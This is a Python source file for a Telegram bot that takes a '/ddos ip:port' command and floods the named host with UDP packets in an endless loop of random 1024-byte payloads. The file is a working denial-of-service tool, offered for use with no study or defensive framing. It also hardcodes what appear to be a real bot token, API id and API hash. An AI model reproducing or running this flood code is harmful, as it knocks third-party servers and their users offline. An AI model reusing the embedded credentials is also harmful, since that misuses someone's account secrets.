import asyncio
import random
import socket
import threading
from telethon import TelegramClient, events, errors

token = "5672989052:AAF0-x61fXrpKG7Fr5L_6FI7IecyrxW0XHg"
client = TelegramClient("ihffggcfnccnbfccfhhbbhhsshsanagghbgg", "2731479", "486ad2aacadade59cae7cd7c5f0b7913")

async def start_bot():
    await client.start(bot_token=token)
    await client.run_until_disconnected()

async def ddos(event, ip, port):
    message = await event.respond("Starting DDOS attack...")
    for e in range(99999):
        zz = random._urandom(1024)
        i = random.choice(("[*]", "[!]", "[#]"))
        mm = []
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), port)
                for x in range(20000):
                    s.sendto(zz, addr)
                await asyncio.sleep(1)  
                await client.edit_message(event.chat_id, message.id, f"{i} ' COLOK YG DALEM")
            except errors.MessageIdInvalidError:
                break
            except Exception as e:
                await client.edit_message(event.chat_id, message.id, f"{i} {e}")
                break

@client.on(events.NewMessage(pattern="(?:.ddos|/ddos) (.*)"))
async def nong(event):
    u = await event.get_sender()
    data = event.pattern_match.group(1)
    if data:
        ip = data.split(":")[0]
        port = int(data.split(":")[1])
        asyncio.create_task(ddos(event, ip, port))

async def run_bot():
    await asyncio.gather(start_bot())

asyncio.run(run_bot())
